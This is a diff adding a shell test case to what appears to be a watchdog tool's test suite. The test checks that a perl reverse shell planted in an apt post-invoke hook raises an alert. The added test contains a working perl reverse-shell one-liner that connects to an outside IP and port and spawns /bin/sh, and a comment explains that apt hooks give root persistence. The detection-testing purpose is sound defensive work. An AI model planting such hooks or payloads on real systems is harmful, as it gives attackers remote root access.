@@ -314,3 +314,22 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on apt hook surface)" {
+    # Sister to nc / python -c / bash / curl|bash / dev-tcp apt-hook
+    # rev-shell variants already locked. Perl is installed on every
+    # Debian/Ubuntu host (dpkg/locale tooling dependency) and its
+    # `use Socket` family yields a one-liner connect-back PTY just
+    # as cleanly as Python. Locks the perl axis on the apt-
+    # transaction-trigger root-exec persistence surface (T1546 —
+    # apt hooks run AS ROOT on every package install/upgrade/remove;
+    # operator's routine apt upgrade fires the planted perl
+    # rev-shell). Interpreter family fan-out matters — attackers
+    # adapt to whichever interpreter pattern-detectors miss.
+    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'DPkg::Post-Invoke {"perl -e \\"use Socket;\\\\$i=\\\\\\"1.1.1.1\\\\\\";\\\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\"tcp\\\\\\"));connect(S,sockaddr_in(\\\\$p,inet_aton(\\\\$i)));exec(\\\\\\"/bin/sh -i\\\\\\");\\"";};\n' > "${HOOK}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
